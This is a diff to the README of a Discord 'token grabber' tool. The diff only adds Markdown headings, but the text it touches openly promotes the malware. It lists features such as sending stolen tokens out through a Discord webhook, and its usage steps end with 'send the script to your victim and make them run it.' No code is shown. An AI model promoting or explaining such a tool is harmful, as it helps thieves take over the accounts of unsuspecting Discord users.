@@ -5,7 +5,7 @@
 
 THIS IS THE ONE OF THE BEST TOKEN GRABBER ON DISCORD DEVLOPED BY DEREKPLAYZ 
 
-Features
+# Features
 
 • No local caching
 • Transfers via Discord webhook
@@ -13,7 +13,7 @@ Features
 • No external Python modules required
 • [todo] Cross-platform support
 
-How to use
+# How to use
 
 • Create a webhook on your Discord server. I recommend creating a new server.
 
@@ -24,6 +24,6 @@ How to use
 • Send the script to your victim and make them run it.
 
 
-Author
+# Author
 
 https://discord.gg/DzdK5C8z4c
